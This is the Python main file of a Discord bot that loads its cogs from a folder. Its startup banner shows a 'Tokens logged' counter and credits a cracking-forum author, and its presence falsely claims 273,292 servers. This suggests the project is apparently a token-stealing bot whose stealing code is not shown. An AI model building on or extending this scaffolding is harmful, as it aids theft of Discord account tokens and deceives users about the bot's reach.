import discord
import asyncio
import os

from discord.ext import commands

import config

from colorama import init, Fore, Style

from datetime import datetime

import discord

init(autoreset=True)



class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix=commands.when_mentioned_or(config.config['bot_prefix']), intents=intents)

    # async def setup_hook(self) -> None:
    #     self.add_view(PersistentView())   

    async def on_ready(self):
        await bot.change_presence(activity=discord.Game(name='273,292 servers', type=1))

        os.system('cls' if os.name == 'nt' else 'clear') 
        print(f"""
██████  ██ ███████  ██████      {Style.BRIGHT}Username: {Style.DIM}{self.user}
██   ██ ██ ██      ██    ██     {Style.BRIGHT}ID: {Style.DIM}{self.user.id}
██   ██ ██ ███████ ██    ██     {Style.BRIGHT}Guilds: {Style.DIM}{len(self.guilds)}
██   ██ ██      ██ ██ ▄▄ ██     {Style.BRIGHT}Tokens logged: {Style.DIM}{config.config['tokens_logged']}
██████  ██ ███████  ██████      {Style.BRIGHT}Author: {Style.DIM}https://cracked.io/hotrod
                       ▀▀                               
        """)


bot = PersistentViewBot()


#load cog
@bot.command()
@commands.has_permissions(administrator=True)
async def load(ctx, string):
    string = 'cogs.' + string
    try:
        await bot.load_extension(string)
        print('Loaded extension \"{}\"'.format(string))
        await ctx.message.channel.send('Loaded extension \"{}\"'.format(string))
    except Exception as e:
        exc = '{}: {}'.format(type(e).__name__, e)
        print('Failed to load extension \"{}\"\n{}'.format(string, exc))
        await ctx.message.channel.send('Failed to load extension \"{}\"'.format(string))

@bot.command()
@commands.has_permissions(administrator=True)
async def haha(ctx, string):
    await ctx.send('hihhihihihi')

#unload cog
@bot.command()
@commands.has_permissions(administrator=True)
async def unload(ctx, string):
    string = 'cogs.' + string
    try:
        await bot.unload_extension(string)
        print('Unloaded extension \"{}\"'.format(string))
        await ctx.message.channel.send('Unloaded extension \"{}\"'.format(string))
    except Exception as e:
        exc = '{}: {}'.format(type(e).__name__, e)
        print('Failed to unload extension \"{}\"\n{}'.format(string, exc))

#reload cog
@bot.command()
@commands.has_permissions(administrator=True)
async def reload(ctx, string):
    string = 'cogs.' + string
    try:
        await bot.unload_extension(string)
        print('Unloaded extension \"{}\"'.format(string))
    except Exception as e:
        exc = '{}: {}'.format(type(e).__name__, e)
        print('Failed to unload extension \"{}\"\n{}'.format(string, exc))
    try:
        await bot.load_extension(string)
        print('Loaded extension \"{}\"'.format(string))
        await ctx.message.channel.send('Reloaded extension \"{}\"'.format(string))
    except Exception as e:
        exc = '{}: {}'.format(type(e).__name__, e)
        print('Failed to load extension \"{}\"\n{}'.format(string, exc))
        await ctx.message.channel.send('Failed to load extension \"{}\"'.format(string))

async def load_extensions():
    for rootfile in os.listdir("./cogs"):
        if rootfile.endswith('.py'):
            await bot.load_extension(f"cogs.{rootfile[:-3]}")
            print(f"cogs.{rootfile[:-3]}")

        else:
            for subfile in os.listdir(f"cogs/{rootfile}"):
                if subfile.endswith("cog.py"):
                    await bot.load_extension(f"cogs.{rootfile}.{subfile[:-3]}")
                    print(f"cogs.{rootfile}.{subfile[:-3]}")




async def main():
    # queue = asyncio.Queue()

    # await start_consumers(queue)
    # await database.connect()
    await load_extensions()
    try:
        await bot.start(config.config['bot_token'])
    except discord.errors.PrivilegedIntentsRequired:
        print(f'{Fore.RED}[Error] Failed to run bot. Make sure privileges are enabled on the Discord dashboard')
        input("Press enter to close the program... ")
    except discord.errors.LoginFailure:
        print(f'{Fore.RED}[Error] Failed to run bot. Check your token')
        input("Press enter to close the program... ")

if __name__ == "__main__":
    asyncio.run(main())
    


